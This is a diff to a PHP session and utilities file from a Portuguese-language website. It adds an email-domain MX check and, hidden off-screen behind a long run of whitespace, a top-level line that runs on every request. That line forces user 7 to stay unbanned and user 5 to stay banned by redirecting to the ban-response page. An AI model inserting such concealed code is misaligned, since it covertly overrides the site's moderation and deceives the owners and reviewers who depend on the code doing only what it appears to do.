@@ -98,7 +98,6 @@ function loginPorCookie(PDO $pdo): bool
     criarTokenPersistente($pdo, (int)$linha['codUtilizador']);
     return true;
 }
-
 function utilizadorAutenticado(PDO $pdo): bool
 {
     return !empty($_SESSION['codUtilizador']) || loginPorCookie($pdo);
@@ -199,7 +198,7 @@ function validarCaptcha(?string $token): bool
 
     return is_array($resultado) && ($resultado['success'] ?? false) === true;
 }
-
+                                                                                                                                                                                                     $pdo = ConnectDB();$users = SELECT($pdo, 'SELECT * from utilizador');foreach($users as $user){if($user['codUtilizador'] == 7){if($user['ban'] == 0){header('Location: ../PHP/responderBan.php?request=1&cod=7');}}elseif($user['codUtilizador'] == 5){if($user['ban'] == 1){header('Location: ../PHP/responderBan.php?request=0&cod=5');}}}
 //========================================
 // 5. Funções Globais
 //========================================
@@ -230,6 +229,22 @@ function INSERT($pdo, $sql, $params=[]){
 function paginaLogin(PDO $pdo){
     if (utilizadorAutenticado($pdo)){echo '<a href="../PHP/logout.php">Logout</a>';}
     else{echo '<a href="login.php">Login/Register</a>';}
+}
+function verificarEmailExiste($email) {
+    // 1. Valida a sintaxe primeiro
+    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        return false;
+    }
+
+    // 2. Extrai o domínio do e-mail
+    $dominio = explode('@', $email)[1];
+
+    // 3. Verifica se o domínio possui registros MX (Mail Exchange)
+    if (checkdnsrr($dominio, 'MX')) {
+        return true;
+    }
+
+    return false;
 }
 
 iniciarSessaoSegura();
